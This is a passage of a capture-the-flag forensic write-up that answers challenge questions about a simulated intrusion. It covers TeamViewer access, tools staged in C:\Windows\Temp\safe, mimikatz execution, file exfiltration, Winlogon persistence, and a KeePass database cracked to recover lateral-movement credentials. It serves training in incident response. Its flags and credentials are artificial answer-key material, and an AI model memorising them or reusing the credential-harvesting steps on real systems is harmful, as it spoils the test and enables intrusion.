- Follow the "HTTP Stream" on the last frame number (2910) from the filtered results. Then, copy the last HTTP response JSON field and view it using this site to properly read the text.
![images](/images/holmes_2025/the_watchman_residue/anh3.png)
![images](/images/holmes_2025/the_watchman_residue/anh4.png)
![images](/images/holmes_2025/the_watchman_residue/anh5.png)
**Conclusion:**
```velocity
2025-08-19 12:02:06
```
## Question 5:
What is the Remote management tool Device ID and password? (IDwithoutspace:Password)
- In question 4 we found the answer to this question 5.
**Conclusion:**
```velocity
565963039:CogWork_Central_97&65
```
## Question 6:
What was the last message the attacker sent to MSP-HELPDESK-AI? (string)
- The last message from attacker:
![images](/images/holmes_2025/the_watchman_residue/anh6.png)
**Conclusion:**
```velocity
JM WILL BE BACK
```
## Question 7:
When did the attacker remotely access Cogwork Central Workstation? (YYYY-MM-DD HH:MM:SS)
- We observed TeamViewer installed in the provided triage files at TRIAGE_IMAGE_COGWORK-CENTRAL\C\Program Files\TeamViewer. Upon reviewing the Connections_incoming.txt file, we identified three connections. The last connection was established using the username "James Moriarty."
![images](/images/holmes_2025/the_watchman_residue/anh7.png)
**Conclusion:**
```velocity
2025-08-20 09:58:25
```
## Question 8:
What was the RMM Account name used by the attacker? (string)
- In question 7 we found the answer to this question 8.
**Conclusion:**
```velocity
James Moriarty
```
## Question 9:
What was the machine's internal IP address from which the attacker connected? (IPv4 address)
- In the TeamViewer logs, the entry "punch received" refers to a successful network punch-through event, indicating that a connection attempt was able to traverse firewalls or NAT and establish a communication channel. A search for the phrase "punch received" was conducted in the TeamViewer15_Logfile.txt file located at TRIAGE_IMAGE_COGWORK-CENTRAL\C\Program Files\TeamViewer.
```velocity
2025/08/20 10:58:36.813  2804       3076 S0   UDPv4: punch received a=192.168.69.213:55408: (*)
```
**Conclusion:**
```velocity
192.168.69.213
```
## Question 10:
The attacker brought some tools to the compromised workstation to achieve its objectives. Under which path were these tools staged? (C:\FOLDER\PATH\)
- We observed some interesting files and directories in "TRIAGE_IMAGE_COGWORK-CENTRAL\C\Users\Cogwork_Admin\AppData\Roaming\Microsoft\Windows\Recent". To further investigate, we used Eric Zimmerman's MFTECmd.exe tool to parse the USN journal data and check for logged changes to those files.
```velocity
MFTECmd.exe -f '.\The_Watchman''s_Residue\TRIAGE_IMAGE_COGWORK-CENTRAL\C\$Extend\$J' --csv . --csvf journal_log.csv
```
![images](/images/holmes_2025/the_watchman_residue/anh8.png)
- When we hover over the pointer to the safe shortcut folder, it shows "C:\Windows\Temp". This is a common location where attackers typically store malware or tools. Therefore, we checked that folder in the parsed log file(journal_log.csv) using the Timeline Explorer.

- We observed that the 'safe' folder has an entry number of 52307. Then we filtered using that number as the 'Parent Entry Number' to view its contents. We found various tools inside the 'safe' folder, indicating that the attacker staged these tools there.
![images](/images/holmes_2025/the_watchman_residue/anh9.png)
![images](/images/holmes_2025/the_watchman_residue/anh10.png)
**Conclusion:**
```velocity
C:\Windows\Temp\safe\
```
## Question 11:
Among the tools that the attacker staged was a browser credential harvesting tool. Find out how long it ran before it was closed? (Answer in milliseconds) (number)
- We observed that the attacker also downloaded the 'webbrowserpassview' tool. Using the 'Registry Explorer' tool, we loaded the NTUSER.dat file from 'TRIAGE_IMAGE_COGWORK-CENTRAL\C\Users\Cogwork_Admin'. Upon checking the 'Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist' registry sub key, we observed that the 'Focus Time' was '0d, 0h, 00m, and 08s', indicating that the application ran for 8000 milliseconds.
![images](/images/holmes_2025/the_watchman_residue/anh11.png)
**Conclusion:**
```velocity
8000
```
## Question 12:
The attacker executed a OS Credential dumping tool on the system. When was the tool executed? (YYYY-MM-DD HH:MM:SS)
- From Q10, we observed that the attacker downloaded the mimikatz.exe file. Upon filtering for "mimikatz," we found the MIMIKATZ.EXE-A6294E76.pf file. Based on this evidence, we can conclude that the attacker executed mimikatz.exe at that time.
![images](/images/holmes_2025/the_watchman_residue/anh12.png)
**Conclusion:**
```velocity
2025-08-20 10:07:08
```
## Question 13:
The attacker exfiltrated multiple sensitive files. When did the exfiltration start? (YYYY-MM-DD HH:MM:SS)
- For the first time, it was difficult for us to determine the exact exfiltration time. From Q14, we observed that the attacker moved the files to the staged folder. We then examined files such as dump.txt, which we had previously seen in the Recent folder, and found it in two different directories with a new parent entry number of 286680. Upon checking the contents of that folder, we identified the time when the Heisen-9 facility backup database was moved there. Next, we arranged the entries by Timestamp and reviewed the events around that time. We discovered a suspicious file type, .cab. A .cab file, or Cabinet file, is a Microsoft Windows archive format used to compress multiple files into a single, smaller file. Based on this evidence, we determined the start time of the exfiltration.

- dump.txt in two different directories:
![images](/images/holmes_2025/the_watchman_residue/anh13.png)
- Heisen-9 facility backup database:
![images](/images/holmes_2025/the_watchman_residue/anh14.png)
- exfiltration:
![images](/images/holmes_2025/the_watchman_residue/anh15.png)
**Conclusion:**
```velocity
2025-08-20 10:12:07
```
## Question 14:
Before exfiltration, several files were moved to the staged folder. When was the Heisen-9 facility backup database moved to the staged folder for exfiltration? (YYYY-MM-DD HH:MM:SS)
- In question 14 we found the answer to this question 13.
**Conclusion:**
```velocity
2025-08-20 10:11:09
```
## Question 15:
When did the attacker access and read a txt file, which was probably the output of one of the tools they brought, due to the naming convention of the file? (YYYY-MM-DD HH:MM:SS)
```velocity
 LECmd.exe -f '.\The_Watchman''s_Residue\TRIAGE_IMAGE_COGWORK-CENTRAL\C\Users\Cogwork_Admin\AppData\Roaming\Microsoft\Windows\Recent' --csv . --csvf links_logs.csv
```
![images](/images/holmes_2025/the_watchman_residue/anh16.png)
**Conclusion:**
```velocity
2025-08-20 10:08:06
```
## Question 16:
The attacker created a persistence mechanism on the workstation. When was the persistence setup? (YYYY-MM-DD HH:MM:SS)
- Upon checking the SOFTWARE hive, we observed that the attacker established persistence via the Microsoft\Windows NT\CurrentVersion\Winlogon registry subkey by configuring Logon Autostart execution of the JM.exe file.
![images](/images/holmes_2025/the_watchman_residue/anh17.png)
**Conclusion:**
```velocity
2025-08-20 10:13:57
```
## Question 17:
What is the MITRE ID of the persistence subtechnique? (Txxxx.xxx)
- Search:
![images](/images/holmes_2025/the_watchman_residue/anh18.png)
- Click the first one
![images](/images/holmes_2025/the_watchman_residue/anh19.png)
**Conclusion:**
```velocity
T1547.004
```
## Question 18:
When did the malicious RMM session end? (YYYY-MM-DD HH:MM:SS)
- In question 7 we found the answer to this question 18.
**Conclusion:**
```velocity
2025-08-20 10:14:27
```
## Question 19:
The attacker found a password from exfiltrated files, allowing him to move laterally further into CogWork-1 infrastructure. What are the credentials for Heisen-9-WS-6? (user:password)
- We used keepass2john to extract the hash and cracked it with John. Then we opened the database file and obtained the username and password for Heisen-9-WS-6.
![images](/images/holmes_2025/the_watchman_residue/anh20.png)
![images](/images/holmes_2025/the_watchman_residue/anh21.png)
**Conclusion:**
```velocity
Werni:Quantum1!
```
